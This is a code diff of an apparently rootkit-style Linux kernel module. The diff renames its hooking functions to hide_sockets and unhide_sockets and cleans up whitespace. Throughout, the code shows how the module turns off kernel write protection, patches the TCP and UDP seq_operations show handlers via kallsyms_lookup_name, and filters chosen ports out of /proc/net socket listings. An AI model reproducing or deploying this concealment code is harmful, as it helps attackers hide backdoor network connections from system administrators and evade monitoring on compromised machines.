@@ -17,10 +17,10 @@ port_list_t hidden_ports = {
 port_list_t_ptr hidden_ports_tail = &hidden_ports;
 
 
-static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
-static int (*udp4_seq_show)(struct seq_file *seq, void *v);
-static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
-static int (*udp6_seq_show)(struct seq_file *seq, void *v);
+static int (*tcp4_seq_show)(struct seq_file *, void *);
+static int (*udp4_seq_show)(struct seq_file *, void *);
+static int (*tcp6_seq_show)(struct seq_file *, void *);
+static int (*udp6_seq_show)(struct seq_file *, void *);
 
 static int g7_tcp4_seq_show(struct seq_file *, void *);
 static int g7_tcp6_seq_show(struct seq_file *, void *);
@@ -28,24 +28,24 @@ static int g7_udp4_seq_show(struct seq_file *, void *);
 static int g7_udp6_seq_show(struct seq_file *, void *);
 
 void
-hook_show(void)
+hide_sockets(void)
 {
-    tcp4_seq_show 
+    tcp4_seq_show
         = ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show;
 
-    tcp6_seq_show 
+    tcp6_seq_show
         = ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show;
 
-    udp4_seq_show 
+    udp4_seq_show
         = ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show;
 
-    udp6_seq_show 
+    udp6_seq_show
         = ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show;
 
     disable_protection();
     ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
         = (void *)g7_tcp4_seq_show;
-    
+
     ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
         = (void *)g7_tcp6_seq_show;
 
@@ -54,11 +54,11 @@ hook_show(void)
 
     ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show
         = (void *)g7_udp6_seq_show;
-    enable_protection();    
+    enable_protection();
 }
 
 void
-unhook_show(void)
+unhide_sockets(void)
 {
     disable_protection();
     ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
@@ -75,7 +75,7 @@ unhook_show(void)
     enable_protection();
 }
 
-void 
+void
 hide_port(port_t port, proto proto)
 {
     add_port_to_list(&hidden_ports, port, proto);
@@ -152,7 +152,7 @@ remove_port_from_list(port_list_t_ptr list, port_t port, proto proto)
 static int
 g7_tcp4_seq_show(struct seq_file *seq, void *v)
 {
-    //SEQ_START_TOKEN is used to indicate that a 
+    //SEQ_START_TOKEN is used to indicate that a
     //header will be returned first
     if(v == SEQ_START_TOKEN)
         return tcp4_seq_show(seq, v);
@@ -166,7 +166,7 @@ g7_tcp4_seq_show(struct seq_file *seq, void *v)
     if(list_contains_port(&hidden_ports, src, tcp4)
     || list_contains_port(&hidden_ports, dst, tcp4))
         return 0;
-    
+
     return tcp4_seq_show(seq, v);
 }
 
@@ -186,7 +186,7 @@ g7_tcp6_seq_show(struct seq_file *seq, void *v)
     if(list_contains_port(&hidden_ports, src, tcp6)
     || list_contains_port(&hidden_ports, dst, tcp6))
         return 0;
-    
+
     return tcp6_seq_show(seq, v);
 }
 
@@ -222,7 +222,7 @@ g7_udp6_seq_show(struct seq_file *seq, void *v)
     port_t dst = ntohs(inet->inet_dport);
 
    if(list_contains_port(&hidden_ports, src, udp6)
-    || list_contains_port(&hidden_ports, dst, udp6))
+   || list_contains_port(&hidden_ports, dst, udp6))
         return 0;
 
     return udp6_seq_show(seq, v);
